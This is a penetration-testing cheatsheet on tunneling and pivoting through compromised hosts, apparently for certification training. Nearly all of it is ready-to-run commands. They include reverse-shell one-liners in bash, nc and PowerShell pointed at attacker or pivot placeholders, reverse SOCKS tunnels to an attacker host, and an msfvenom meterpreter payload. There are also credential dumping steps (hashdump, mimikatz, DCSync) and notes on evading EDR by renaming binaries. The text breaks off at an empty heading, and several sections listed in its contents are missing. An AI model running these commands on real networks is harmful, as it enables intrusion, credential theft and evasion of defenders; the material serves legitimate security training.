# Tunneling & Pivoting Cheatsheet

Quick reference for pivoting through compromised hosts to reach internal network segments.

For initial service discovery, see [Enumeration Methodology](enumeration-methodology.md). For file transfer methods, see [File Transfers](file-transfers.md).

> **Placeholder convention:** This file uses indexed placeholders for multi-hop chains: `<USER1>`/`<USER2>`/`<USER3>` are distinct credentials at hops 1/2/3; `<PIVOT_HOST_1>`/`<PIVOT_HOST_2>` are intermediate hosts; `<INTERNAL_TARGET_1>`/`<INTERNAL_TARGET_2>` are end-of-chain hosts in dual-target chains. Single-hop scenarios use `<USER>`, `<PIVOT_HOST>`, `<ATTACKER_IP>`, `<INTERNAL_TARGET>`.

## Table of Contents

- [SSH Tunneling](#ssh-tunneling)
- [Ligolo-ng (Route-Based Pivoting)](#ligolo-ng-route-based-pivoting)
- [Chisel](#chisel)
- [rpivot, revsocks, gost (Chisel Fallbacks)](#rpivot-revsocks-gost-chisel-fallbacks)
- [Socat](#socat)
- [sshuttle](#sshuttle)
- [Metasploit Pivoting (Route-Based)](#metasploit-pivoting-route-based)
- [C2 Framework Pivoting](#c2-framework-pivoting)
- [Windows-Specific Pivoting](#windows-specific-pivoting)
- [Proxychains Configuration](#proxychains-configuration)
- [Open HTTP Proxy Abuse (Squid / mod_proxy as a Pivot)](#open-http-proxy-abuse-squid--mod_proxy-as-a-pivot)
- [DNS Tunneling (dnscat2)](#dns-tunneling-dnscat2)
- [DNS Tunneling (iodine)](#dns-tunneling-iodine)
- [ICMP Tunneling](#icmp-tunneling)
- [Webshell Tunnels](#webshell-tunnels)
- [Port-Knocking — Bypass Filtered SSH/Service Ports](#port-knocking--bypass-filtered-sshservice-ports)
- [IPSec Transport Tunnel — Host Firewall Bypass (strongSwan)](#ipsec-transport-tunnel--host-firewall-bypass-strongswan)
- [Quick Decision Guide](#quick-decision-guide)

---

## SSH Tunneling

### Local Port Forward (`-L`)
```bash
# ATTACKER → PIVOT (attacker dials in):
# 🟢 ssh -L is a local-only forward — does NOT cross trust boundary outbound from the target; just an authenticated SSH session from attacker's perspective. Standard RA/admin pattern, not a network IOC.
ssh -L 8080:<INTERNAL_TARGET>:80 <USER>@<PIVOT_HOST>
# curl http://127.0.0.1:8080 on attacker → <INTERNAL_TARGET>:80

# Common services
ssh -L 3306:<INTERNAL_DB>:3306 <USER>@<PIVOT_HOST>
ssh -L 5985:<INTERNAL_HOST>:5985 <USER>@<PIVOT_HOST>
ssh -L 3389:<INTERNAL_HOST>:3389 <USER>@<PIVOT_HOST>
ssh -L 1433:<INTERNAL_DB>:1433 <USER>@<PIVOT_HOST>
ssh -L 88:<INTERNAL_DC>:88 -L 389:<INTERNAL_DC>:389 -L 445:<INTERNAL_DC>:445 \
    <USER>@<PIVOT_HOST>

# Bind on all interfaces (requires GatewayPorts yes on pivot's sshd)
ssh -L 0.0.0.0:8080:<INTERNAL_TARGET>:80 <USER>@<PIVOT_HOST>
```

### Remote Port Forward (`-R`)
```bash
# TARGET → ATTACKER (target dials out, exposes internal:80 to attacker)
# 🔴 ssh -R from target to attacker = reverse-tunnel pattern (long-lived outbound SSH to non-corp IP) — Zeek/Suricata fingerprint, EDR network-anomaly. Egress-firewall + DLP both alert. Engagement-only; obscure with corp-shaped dest IP/port (443) when scope permits.
# TARGET runs:
ssh -R 8080:<INTERNAL_TARGET>:80 <USER>@<ATTACKER_IP> -N -f
# ATTACKER: curl http://127.0.0.1:8080 → internal:80

# Reverse-shell relay — attacker's :8443 becomes reachable on pivot's :8443
# TARGET runs:
ssh -R 8443:127.0.0.1:8443 <USER>@<ATTACKER_IP> -N -f
# ATTACKER: nc -lvnp 8443   (must be listening before deeper host triggers)

# Bind 0.0.0.0 on attacker side (so deeper hosts can hit pivot:8443):
# Attacker's /etc/ssh/sshd_config → GatewayPorts yes
```

### Reverse Dynamic SOCKS Proxy (Target-Initiated)
Target SSHs **out** to the attacker, creating a SOCKS5 proxy on the attacker's side.
Requires OpenSSH **7.6+** on the client (the target). The attacker only needs a standard `sshd`.
```bash
# TARGET runs this (initiates outbound SSH to attacker's sshd):
ssh -R 1080 <USER>@<ATTACKER_IP> -N -f
# → Opens SOCKS5 proxy on ATTACKER at 127.0.0.1:1080
# → All traffic through this proxy exits from the TARGET's perspective

# ATTACKER: use the proxy (target's network is now reachable)
# /etc/proxychains4.conf → socks5 127.0.0.1 1080
proxychains4 nmap -sT -Pn <INTERNAL_TARGET>
proxychains4 netexec smb <INTERNAL_SUBNET>/24
# 🟡 SOCKS proxychains through victim — every TCP connect() now sources from the pivot's IP, which generates volumetric internal scan traffic from a non-recon-host = NetFlow / Carbon Black "internal scan from server" alert. Pin your scan rate (--max-rate 50, -T2) and target only known hosts.
curl --socks5 127.0.0.1:1080 http://<INTERNAL_TARGET>/

# Legacy fallback (OpenSSH < 7.6) — two-step:
# TARGET: create local SOCKS + forward it to attacker
ssh -D 127.0.0.1:9050 -N -f localhost
ssh -R 1080:127.0.0.1:9050 <USER>@<ATTACKER_IP> -N -f
# ATTACKER: proxychains → socks5 127.0.0.1 1080 (same usage)
```

> **When to use:** The target can reach the attacker (egress SSH allowed) but the attacker **cannot** reach the target (inbound blocked / NAT). This is the reverse of `ssh -D`. The target dials out; the attacker gets a full SOCKS proxy into the target's network.

### Dynamic Port Forward (`-D`, SOCKS Proxy)
```bash
# ATTACKER → PIVOT (attacker dials in):
ssh -D 1080 <USER>@<PIVOT_HOST>
# SOCKS5 on attacker's 127.0.0.1:1080

# /etc/proxychains4.conf:
#   socks5 127.0.0.1 1080
#   proxy_dns

proxychains4 nmap -sT -Pn <INTERNAL_TARGET>
proxychains4 netexec smb <INTERNAL_SUBNET>/24
proxychains4 evil-winrm -i <INTERNAL_TARGET> -u '<USER>' -p '<PASSWORD>'
```

### SOCKS direction quick-pick

| Scenario | Command | Initiates | SOCKS endpoint |
|---|---|---|---|
| Attacker can SSH into pivot | `ssh -D 1080 <USER>@<PIVOT_HOST>` (attacker) | attacker | attacker `127.0.0.1:1080` |
| Pivot can SSH out to attacker | `ssh -R 1080 <USER>@<ATTACKER_IP>` (target) | target | attacker `127.0.0.1:1080` |

### SSH Options
```bash
# Background the tunnel (no shell)
ssh -f -N -D 1080 <USER>@<PIVOT_HOST>

# Use SSH key
ssh -i id_rsa -D 1080 <USER>@<PIVOT_HOST>

# Non-standard port
ssh -p 2222 -D 1080 <USER>@<PIVOT_HOST>

# Avoid host key prompt
ssh -o StrictHostKeyChecking=no -D 1080 <USER>@<PIVOT_HOST>

# ProxyJump — multi-hop SSH through intermediate hosts (clean alternative to nested tunnels)
ssh -J <USER1>@<PIVOT1> <USER2>@<INTERNAL_HOST>

# Chain multiple jumps
ssh -J <USER1>@<PIVOT1>,<USER2>@<PIVOT2> <USER3>@<DEEP_HOST>

# ProxyJump with key files
ssh -J <USER1>@<PIVOT1> -i ~/.ssh/internal_key <USER2>@<INTERNAL_HOST>

# Equivalent ~/.ssh/config entry (persistent)
# Host internal
#     HostName <INTERNAL_HOST>
#     User <USER2>
#     ProxyJump <USER1>@<PIVOT1>
```

### Living-off-the-land equivalents — pure-shell relays

When SSH client/server isn't available on the pivot, use the OS shell to forward TCP without dropping any binary.

```bash
# bash /dev/tcp + mkfifo + nc — bidirectional TCP relay (Linux pivot, no chisel/socat)
# Listens on <PIVOT_HOST>:8080, relays to <INTERNAL_TARGET>:80
mkfifo /tmp/f
nc -lvp 8080 < /tmp/f | nc <INTERNAL_TARGET> 80 > /tmp/f
# Cleanup: rm /tmp/f

# Pure bash (no nc) — works only with bash, NOT on Alpine ash / busybox shells
# 🔴 alert-likely — bash /dev/tcp outbound to non-corp IP/port = textbook auditd execve(bash) + connect() syscall pattern; Falco "Reverse shell via /dev/tcp" rule + every modern Linux EDR fires. Use SSH or chisel inside a TLS-on-443 wrapper for engagement work; this raw form is for proof-of-concept only.
# Reverse-relay attacker:8443 → pivot → internal:445
exec 3<>/dev/tcp/<ATTACKER_IP>/8443
exec 4<>/dev/tcp/<INTERNAL_TARGET>/445
cat <&3 >&4 &
cat <&4 >&3
```

**Attacker-side commands** — every relay above needs the attacker to actually *use* it:
```bash
# For the mkfifo + nc relay (pivot listens on :8080, forwards to internal:80):
# ATTACKER: connect to the relay
curl http://<PIVOT_IP>:8080                    # HTTP service
nc <PIVOT_IP> 8080                             # raw TCP
# Or point any tool at <PIVOT_IP>:8080 as if it were the internal service

# For the pure-bash reverse-relay (pivot connects OUT to attacker:8443):
# ATTACKER: must be listening BEFORE the target runs its relay
nc -lvnp 8443                                  # catch the relay
# Data flows: attacker:8443 ↔ pivot ↔ internal:445
```

**Exposing target's own localhost service** — target has a service on `127.0.0.1:8888` that you need to reach:
```bash
# TARGET (creates relay from its own public port to its localhost service):
mkfifo /tmp/f
nc -lvp 8456 </tmp/f | nc 127.0.0.1 8888 >/tmp/f

# ATTACKER (connects to the relay to reach target's localhost:8888):
curl http://<TARGET_IP>:8456                   # if HTTP
nc <TARGET_IP> 8456                            # raw TCP
# Cleanup on target: rm /tmp/f

# If target CANNOT accept inbound — flip the direction (target dials out):
# ATTACKER: nc -lvnp 8456
# TARGET:   mkfifo /tmp/f; nc <ATTACKER_IP> 8456 </tmp/f | nc 127.0.0.1 8888 >/tmp/f
# Now attacker's nc session is piped into target's localhost:8888
```

> **`/dev/tcp` distro support:** Debian/Ubuntu/RHEL/Kali bash all support it. **Alpine `ash` / busybox `/bin/sh` does NOT** — bash must be installed first, or use the `nc + mkfifo` form (busybox `nc` works) or fall back to a Python one-liner.

> **Windows OpenSSH client:** see [Native ssh.exe (Built-in since Windows 10 1809 / Server 2019)](#native-sshexe-built-in-since-windows-10-1809--server-2019) below for the canonical Windows-side `ssh -L`/`-R`/`-D` reference.

---

## Ligolo-ng (Route-Based Pivoting)

Modern, encrypted, route-based tunneling. No SOCKS overhead — tools work natively.

### Setup
```bash
# https://github.com/nicocha30/ligolo-ng/releases
# Get both proxy (attacker) and agent (target) binaries for the correct OS/arch

# ATTACKER: Create TUN interface and start proxy
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# TARGET: Connect agent back to proxy
# 🟡 logged — ligolo agent is a Go binary with TLS-over-non-443 (default :11601) — modern EDR (Defender for Endpoint, CrowdStrike) flags Go binaries with persistent outbound TLS to non-standard ports; binary string "ligolo" / cert subject "Selfsigned" both signatured. Rebrand binary + use :443 if scope permits.
# Linux:
./agent -connect <ATTACKER_IP>:11601 -ignore-cert
# Windows:
.\agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert
```

### Add Routes
```bash
# In ligolo proxy console:
session                    # Select the agent session
ifconfig                   # View target's network interfaces

# On attacker — add route to internal subnet
sudo ip route add <INTERNAL_SUBNET>/24 dev ligolo

# Start the tunnel
start                      # In ligolo proxy console

# Now access internal hosts directly (no proxychains needed!)
nmap -sT -Pn <INTERNAL_TARGET>
evil-winrm -i <INTERNAL_TARGET> -u '<USER>' -p '<PASSWORD>'
netexec smb <INTERNAL_SUBNET>/24 -u '<USER>' -p '<PASSWORD>'
```

### Listeners (Reverse Shells Through Pivot)
```bash
# In ligolo proxy console:
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
# Now reverse shells from internal hosts to <PIVOT_IP>:4444 reach attacker's port 4444

# List listeners
listener_list

# Remove listener
listener_del <LISTENER_ID>
```

### Listeners (Expose Agent's Local Service to Attacker)
Use `listener_add` in the **opposite direction** — make a service on the *agent's* localhost reachable from the attacker.
```bash
# Scenario: Agent has a web admin panel on 127.0.0.1:8080 (only listens on loopback)
# You want to access it from your attacker at http://127.0.0.1:8080

# In ligolo proxy console (select the agent's session first):
listener_add --addr 127.0.0.1:8080 --to 127.0.0.1:8080 --tcp --reverse
# → Attacker can now browse http://127.0.0.1:8080 and reach the agent's loopback service

# Expose agent's RDP (agent is a Windows host with RDP on 127.0.0.1:3389):
listener_add --addr 127.0.0.1:3389 --to 127.0.0.1:3389 --tcp --reverse
# ATTACKER: xfreerdp /v:127.0.0.1 /u:'<USER>' /p:'<PASSWORD>'

# File transfer — serve files on attacker, make them reachable FROM the agent:
# ATTACKER: python3 -m http.server 8000
listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:8000 --tcp
# AGENT: curl http://127.0.0.1:8000/linpeas.sh (downloads from attacker's python server)
```

> **Direction rule:** `--addr` = where the listener binds. `--to` = where traffic is sent. Without `--reverse`, `--addr` binds on the **agent** and `--to` sends to the **attacker**. With `--reverse`, `--addr` binds on the **attacker** and `--to` sends to the **agent**.

### Double Pivot (Multi-Hop)
```bash
# Scenario: Attacker → Host1 (<EXTERNAL_SUBNET> / <PIVOT_1_INTERNAL_SUBNET>) → Host2 (<PIVOT_1_INTERNAL_SUBNET> / <DEEP_SUBNET>)
# Goal: Reach <DEEP_SUBNET>/24 (e.g. 192.168.1.0/24) through two pivots

# 1. First pivot is already running (Agent 1 on Host1 connected to your proxy)
#    You already have: sudo ip route add <PIVOT_1_INTERNAL_SUBNET>/24 dev ligolo  # e.g. 172.16.1.0/24

# 2. Create a listener on Agent 1 to relay Agent 2's connection back to your proxy
#    In ligolo proxy console, select Agent 1's session:
session
# Select Agent 1
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
# This makes Host1 listen on :11601 and forward to your proxy's :11601

# 3. Transfer ligolo-agent to Host2 (via the first tunnel)
#    Since 172.16.1.0/24 is routed, you can reach Host2 through Host1
#    Use file transfer methods from file-transfers.md

# 4. Run agent on Host2, connecting back through Host1's listener
./agent -connect <PIVOT_HOST_1_INTERNAL_IP>:11601 -ignore-cert
# Example: ./agent -connect 172.16.1.10:11601 -ignore-cert

# 5. Back in ligolo proxy console — Agent 2 should appear
session
# Select Agent 2 (the new session from Host2)
start

# 6. Add route for the deeper subnet
sudo ip route add <DEEP_SUBNET>/24 dev ligolo  # e.g. 192.168.1.0/24

# 7. You can now reach <DEEP_SUBNET>/24 from your attacker machine
#    proxychains is NOT needed — routes go directly through the tun interface
nmap -sT -Pn <DEEP_SUBNET>/24

# 8. If you need to forward a port FROM the deeper network back to you:
#    On Agent 2's session:
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
# Now Host2 listens on :4444 and forwards to your attacker :4444 (for reverse shells)
```

---

## Chisel

Lightweight HTTP-based tunnel. Good for restrictive firewalls.

### SOCKS Proxy
```bash
# https://github.com/jpillora/chisel/releases
# ATTACKER: Start Chisel server
./chisel server -p 8000 --reverse

# TARGET: Connect and create reverse SOCKS proxy
# 🟡 logged — chisel WebSocket-over-HTTP is signatured (binary string "chisel", JA3 fingerprint, distinctive WS handshake). Long-lived outbound to non-corp IP = EDR network-anomaly. Use :443 + reverse-proxy front + rebranded binary for engagement work.
./chisel client <ATTACKER_IP>:8000 R:socks

# SOCKS proxy is now on attacker at 127.0.0.1:1080
# Configure proxychains → socks5 127.0.0.1 1080
proxychains4 nmap -sT -Pn <INTERNAL_TARGET>
```

### Port Forward
```bash
# ATTACKER: Start server
./chisel server -p 8000 --reverse

# TARGET: Forward specific port
./chisel client <ATTACKER_IP>:8000 R:8080:<INTERNAL_TARGET>:80

# Access: http://127.0.0.1:8080 → <INTERNAL_TARGET>:80

# Multiple forwards
./chisel client <ATTACKER_IP>:8000 R:8080:<INTERNAL_TARGET_1>:80 R:3389:<INTERNAL_TARGET_2>:3389

# Kerberos-based impacket tools (aesKey / -k -no-pass) also need port 88
# Port-forward approach (lands on localhost — no proxychains needed):
./chisel client <ATTACKER_IP>:8000 R:445:127.0.0.1:445 R:88:127.0.0.1:88
# Then target as 127.0.0.1 and add its hostname to /etc/hosts pointing to 127.0.0.1

# Preferred: reverse SOCKS (handles all ports dynamically, use proxychains)
./chisel client <ATTACKER_IP>:8000 R:socks
# proxychains handles port 445, 88, 135 and dynamic RPC ports automatically
# Use real DC IP as target (not 127.0.0.1) with proxychains
```

### Local Port Forward (Non-Reverse — Server on Target)
When the attacker **can** reach the target (inbound allowed), skip `--reverse` entirely.
```bash
# TARGET: Start Chisel server (binds on target, accepts inbound from attacker)
./chisel server -p 9000

# ATTACKER: Connect and define the forward
./chisel client <TARGET_IP>:9000 8080:127.0.0.1:80
# → Attacker's localhost:8080 reaches target's 127.0.0.1:80

# Access target's local-only service:
./chisel client <TARGET_IP>:9000 8888:127.0.0.1:8888
# → curl http://127.0.0.1:8888 on attacker reaches target's localhost:8888

# Multiple forwards:
./chisel client <TARGET_IP>:9000 3306:127.0.0.1:3306 5985:<INTERNAL_HOST>:5985

# SOCKS proxy (forward direction — no --reverse needed):
./chisel client <TARGET_IP>:9000 socks
# → SOCKS5 on attacker at 127.0.0.1:1080
```

> **When to use non-reverse:** The attacker can directly reach the target (e.g., you already have network access, or the target is in a DMZ with ports open). Simpler than `--reverse` because the target doesn't need to know the attacker's IP — it just runs `server` and waits.

---

## rpivot, revsocks, gost (Chisel Fallbacks)

Use when chisel is fingerprinted by an IDS, the target Go runtime is missing, or you need a different transport (TLS, multi-protocol). All three deliver a reverse SOCKS proxy similar to chisel.

### rpivot — Python 2 Double TCP Tunnel

Compatible with very old hosts that still ship Python 2.7 (legacy Linux, embedded appliances). No TLS by default.

```bash
# https://github.com/klsecservices/rpivot

# ATTACKER — server (listens for the inbound from the target on 9999, exposes SOCKS on 1080)
python2 server.py --proxy-port 1080 --server-port 9999 --server-ip 0.0.0.0

# TARGET — client connects back to the attacker
python2 client.py --server-ip <ATTACKER_IP> --server-port 9999

# With basic-auth proxy in front (corporate egress)
python2 client.py --server-ip <ATTACKER_IP> --server-port 9999 \
  --ntlm-proxy-ip <PROXY_IP> --ntlm-proxy-port 8080 \
  --domain <DOMAIN> --username <USER> --password <PASSWORD>

# Proxychains → socks4 127.0.0.1 1080  (rpivot speaks SOCKS4 only)
proxychains4 nmap -sT -Pn <INTERNAL_TARGET>
```

### revsocks — Single-Binary TLS Reverse SOCKS5

Go-based, statically compiled, ships with TLS so traffic looks like ordinary HTTPS. Works where chisel is signatured.

```bash
# https://github.com/kost/revsocks

# ATTACKER — listen with TLS, expose SOCKS5 locally on 1080
./revsocks -listen :8443 -socks 127.0.0.1:1080 -pass '<SHARED_SECRET>'

# TARGET — reverse-connect over TLS
./revsocks -connect <ATTACKER_IP>:8443 -pass '<SHARED_SECRET>'

# Behind a corporate proxy
./revsocks -connect <ATTACKER_IP>:8443 -pass '<SHARED_SECRET>' \
  -proxy http://<PROXY_IP>:8080 -proxyauth '<USER>:<PASSWORD>'

# Use it
# /etc/proxychains4.conf → socks5 127.0.0.1 1080
proxychains4 netexec smb <INTERNAL_SUBNET>/24 -u '<USER>' -p '<PASSWORD>'
```

### gost — Multi-Protocol Tunnel Knife

Go-based, supports SOCKS4/5, HTTP, SS, KCP, QUIC, WS over TLS, multi-hop chaining, traffic obfuscation. Useful when egress allows only one specific protocol (HTTP/3, WebSocket, mTLS).

```bash
# https://github.com/go-gost/gost

# ATTACKER — listen on HTTPS-looking port, accept reverse tunnel
./gost -L 'tcp://:8443' -L 'socks5://:1080?bind=true'

# Reverse SOCKS over TLS (target dials out)
# ATTACKER:
./gost -L 'rtcp://:1080/127.0.0.1:1080' -L 'tls://:8443'
# TARGET:
./gost -L 'socks5://:0' -F 'tls://<ATTACKER_IP>:8443'

# WebSocket-over-TLS (often crosses egress proxies)
# ATTACKER:
./gost -L 'mwss://:443'
# TARGET:
./gost -L 'socks5://:1080' -F 'mwss://<ATTACKER_IP>:443'

# Chain through two pivots (multi-hop)
# TARGET (innermost):
./gost -L 'socks5://:1080' -F 'tls://<PIVOT_HOST_2>:8443' -F 'tls://<ATTACKER_IP>:8443'
```

**When to choose which:**

| Tool | Pick when |
|---|---|
| chisel | Default — static Go binary, simple, broadly available |
| revsocks | TLS required, single binary, quick swap when chisel is detected |
| gost | Need a non-standard transport (WSS, KCP, QUIC) or multi-hop chain |
| rpivot | Only Python 2.7 on target, no Go runtime, no static binary upload allowed |
| ligolo-ng | UDP needed, want route-based (no proxychains) interface tun |

---

## Socat

Swiss-army knife for port forwarding / relay.

### Port Forward
```bash
# Forward local port 8080 to remote target
socat TCP-LISTEN:8080,fork TCP:<INTERNAL_TARGET>:80

# On pivot host:
# Forward attacker → internal target
socat TCP-LISTEN:4444,fork TCP:<INTERNAL_TARGET>:4444
```

### Reverse Shell Relay
```bash
# On pivot host — relay connection from internal host to attacker
socat TCP-LISTEN:4444,fork TCP:<ATTACKER_IP>:4444

# Internal host sends reverse shell to pivot:4444 → relayed to attacker:4444

# ATTACKER: must be listening BEFORE the relay is triggered
nc -lvnp 4444

# INTERNAL HOST: trigger the reverse shell pointing at the pivot (NOT the attacker)
bash -c 'bash -i >& /dev/tcp/<PIVOT_IP>/4444 0>&1'              # Linux bash one-liner
nc -e /bin/bash <PIVOT_IP> 4444                                  # Linux nc (if -e enabled)
powershell -nop -c '$c=New-Object Net.Sockets.TCPClient("<PIVOT_IP>",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rs=$r+"PS "+(pwd).Path+"> ";$sb=([text.encoding]::ASCII).GetBytes($rs);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()'   # Windows PowerShell
```

### Expose Target's Own Service to Attacker
```bash
# Scenario: target has a service on 127.0.0.1:8888 (local-only). You want to reach it.

# Option A — target can accept inbound (attacker reaches target directly):
# TARGET: expose localhost:8888 on all interfaces via port 8456
socat TCP-LISTEN:8456,fork,reuseaddr TCP:127.0.0.1:8888
# ATTACKER: connect to it
curl http://<TARGET_IP>:8456

# Option B — target cannot accept inbound (firewall blocks), target dials OUT:
# ATTACKER: listen first
socat TCP-LISTEN:8456,fork,reuseaddr -
# TARGET: connect out and pipe its local service
socat TCP:<ATTACKER_IP>:8456 TCP:127.0.0.1:8888
# Attacker's socat session is now piped into target's localhost:8888

# Expose target's RDP (3389) to attacker:
# TARGET:
socat TCP-LISTEN:13389,fork,reuseaddr TCP:127.0.0.1:3389
# ATTACKER:
xfreerdp /v:<TARGET_IP>:13389 /u:'<USER>' /p:'<PASSWORD>'
```

### Living-off-the-land alternative — bash /dev/tcp + mkfifo relay

When socat / nc-traditional are unavailable on the pivot host (minimal containers, hardened jump boxes). Pure bash builtins.

```bash
# Pivot host — forward attacker:4444 to internal:80 using only bash + mkfifo
# Note: bash /dev/tcp is a builtin — NOT available on Alpine ash / busybox / dash
mkfifo /tmp/p
while true; do
  cat /tmp/p | bash -c 'exec 3<>/dev/tcp/<INTERNAL_TARGET>/80; cat <&3' > /tmp/p2 < /tmp/p
  cat /tmp/p2
done &

# Simpler one-shot relay using nc (often present even when socat is not)
#   Pivot listens on 4444, forwards to internal:80
mkfifo /tmp/relay
nc -lvnp 4444 < /tmp/relay | nc <INTERNAL_TARGET> 80 > /tmp/relay
rm /tmp/relay

# Reverse-shell relay using only bash builtins (no nc)
# Pivot host — listen and pipe stdin/stdout between two TCP sockets
bash -c 'exec 3<>/dev/tcp/<ATTACKER_IP>/4444; exec 4<>/dev/tcp/<INTERNAL_TARGET>/4444; cat <&4 >&3 & cat <&3 >&4'
```

**Attacker-side for the relays above:**
```bash
# nc relay (pivot listens on :4444, forwards to internal:80):
# ATTACKER: connect to the pivot's relay port
curl http://<PIVOT_IP>:4444          # HTTP
nc <PIVOT_IP> 4444                   # raw TCP

# Pure-bash reverse-relay (pivot connects OUT to attacker:4444):
# ATTACKER: listen first, then trigger the relay on the pivot
nc -lvnp 4444
```

> **Limitation:** bash /dev/tcp does not bind/listen — only outbound connect. For listen-side you need `nc`/`ncat`/`socat` or a Python one-liner: `python3 -c 'import socket,os; s=socket.socket(); s.bind(("0.0.0.0",4444)); s.listen(1); ...'`

---

## sshuttle

VPN-like SSH tunneling. Routes entire subnets without SOCKS.

```bash
# Route entire subnet through pivot
sshuttle -r <USER>@<PIVOT_HOST> <INTERNAL_SUBNET>/24

# With SSH key
sshuttle -r <USER>@<PIVOT_HOST> --ssh-cmd 'ssh -i id_rsa' <INTERNAL_SUBNET>/24

# Exclude certain IPs
sshuttle -r <USER>@<PIVOT_HOST> <INTERNAL_SUBNET>/24 -x <PIVOT_IP>

# DNS forwarding
sshuttle --dns -r <USER>@<PIVOT_HOST> <INTERNAL_SUBNET>/24
```

> **⚠️ Unidirectional only:** sshuttle works **attacker → target network** only. There is no reverse sshuttle — the target cannot initiate the tunnel back to the attacker. If you need target-initiated tunneling, use SSH `-R` reverse dynamic SOCKS, Chisel reverse mode, or Ligolo-ng instead.

---

## Metasploit Pivoting (Route-Based)

Route traffic through a Meterpreter session into internal subnets. No extra binary on the target — uses the active session.

### Get a Meterpreter Session

> Full msfvenom payload-format reference: [shells-and-payloads.md](shells-and-payloads.md) and [metasploit-framework.md](metasploit-framework.md).

```bash
# Generate payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f exe -o shell.exe

# Start handler (msfconsole)
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <ATTACKER_IP>
set LPORT 4444
run -j    # background job — waits for incoming connections

# Session management
meterpreter> background      # background the session (or Ctrl+Z)
sessions -l                  # list all sessions
sessions -i <SESSION_ID>     # re-interact with a session
```

### Add Routes to Internal Subnets
```bash
# Method 1: autoroute post module (auto-discovers subnets from target's routing table)
use post/multi/manage/autoroute
set SESSION <SESSION_ID>
set SUBNET <INTERNAL_SUBNET>    # e.g. 172.16.5.0 — leave blank to auto-discover all
run

# Method 2: manual route add (from msfconsole prompt)
route add <INTERNAL_SUBNET>/24 <SESSION_ID>    # e.g. route add 172.16.5.0/24 1
route print    # verify active routes
route remove <INTERNAL_SUBNET>/24 <SESSION_ID>
route flush    # remove all routes

# All Metasploit modules now reach internal hosts via the route
# Example scan through the route:
use auxiliary/scanner/portscan/tcp
set RHOSTS <INTERNAL_SUBNET>/24
set PORTS 22,80,135,139,445,3389,5985
run
```

### SOCKS Proxy (for External Tools)
```bash
# Create a SOCKS5 proxy that proxies through the Metasploit routes
use auxiliary/server/socks_proxy
set VERSION 5
set SRVHOST 127.0.0.1
set SRVPORT 1080
run -j    # run as background job

# Confirm the job is running
jobs -l

# Configure proxychains: /etc/proxychains4.conf → socks5 127.0.0.1 1080

# External tools via proxychains
proxychains4 nmap -sT -Pn -p 22,80,135,445,3389,5985 <INTERNAL_TARGET>
proxychains4 netexec smb <INTERNAL_SUBNET>/24 -u '<USER>' -p '<PASSWORD>'
proxychains4 evil-winrm -i <INTERNAL_TARGET> -u '<USER>' -p '<PASSWORD>'
proxychains4 impacket-secretsdump '<DOMAIN>/<USER>:<PASSWORD>'@<INTERNAL_TARGET>
proxychains4 bloodhound-ce-python -u '<USER>' -p '<PASSWORD>' -ns <INTERNAL_DC> -d <DOMAIN> -c All --zip
# RustHound through SOCKS — set SOCKS in env (proxychains LDAP often times out; rusthound talks SOCKS5 natively):
ALL_PROXY=socks5://127.0.0.1:1080 rusthound-ce -d <DOMAIN> -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -i <INTERNAL_DC> -z
# Or run SharpHound CE on the pivot host itself (Windows foothold) — fastest, no LDAP-over-SOCKS pain:
#   .\SharpHound.exe -c All --ZipFilename bh.zip   (then exfil bh.zip back through pivot)
# Output handling -> see [bloodhound-guide.md](bloodhound-guide.md)
```

### Meterpreter portfwd (Single-Port Forward)
```bash
# Forward attacker's local port → internal service (no SOCKS needed)
# In a Meterpreter session:
meterpreter> portfwd add -l 3389 -p 3389 -r <INTERNAL_TARGET>    # -l local port, -p target port, -r target IP
meterpreter> portfwd add -l 5985 -p 5985 -r <INTERNAL_TARGET>    # WinRM
meterpreter> portfwd add -l 8080 -p 80   -r <INTERNAL_WEBSERVER> # internal web app

meterpreter> portfwd list     # list all active forwards
meterpreter> portfwd flush    # remove all forwards
meterpreter> background

# Access the internal service via 127.0.0.1
xfreerdp /v:127.0.0.1 /u:'<DOMAIN>\<USER>' /p:'<PASSWORD>'
evil-winrm -i 127.0.0.1 -u '<USER>' -p '<PASSWORD>'
curl http://127.0.0.1:8080/
```

### Metasploit Post-Exploitation Modules

Core post-exploitation modules for CPTS engagements once you have an active Meterpreter session.

#### Shell to Meterpreter Upgrade
```bash
# Upgrade a basic command shell (session) to a full Meterpreter session
sessions -u <SESSION_ID>

# Or manually via post module
use post/multi/manage/shell_to_meterpreter
set SESSION <SESSION_ID>
set LHOST <ATTACKER_IP>
set LPORT 4433
run
```

#### Privilege Escalation — getsystem
```bash
# Attempt automatic privilege escalation (requires admin-level shell)
meterpreter> getsystem

# Techniques used (in order):
#   1 - Named Pipe Impersonation (In Memory/Admin)
#   2 - Named Pipe Impersonation (Dropper/Admin)
#   3 - Token Duplication (In Memory/Admin)

# Force a specific technique
meterpreter> getsystem -t 1
```

#### SAM Hash Dump
```bash
# Dump local SAM hashes (requires SYSTEM)
meterpreter> hashdump

# Or via post module (more reliable)
run post/windows/gather/hashdump
```

#### Kiwi (Mimikatz in Meterpreter)
```bash
# Load kiwi extension (requires SYSTEM or high-integrity process)
meterpreter> load kiwi

# Dump all credentials in memory
meterpreter> creds_all

# Kerberos tickets
meterpreter> kerberos_ticket_list

# SAM and LSA dumps
meterpreter> lsa_dump_sam
meterpreter> lsa_dump_secrets

# DCSync — pull NTLM hash for a specific domain user (requires Replicating Directory Changes)
meterpreter> dcsync_ntlm <DOMAIN> <USER>
```

#### Local Exploit Suggester
```bash
# Enumerate missing patches and suggest kernel/service privilege escalation exploits
run post/multi/recon/local_exploit_suggester

# Filter by session
use post/multi/recon/local_exploit_suggester
set SESSION <SESSION_ID>
set SHOWDESCRIPTION true
run
```

#### Credential Gathering Modules
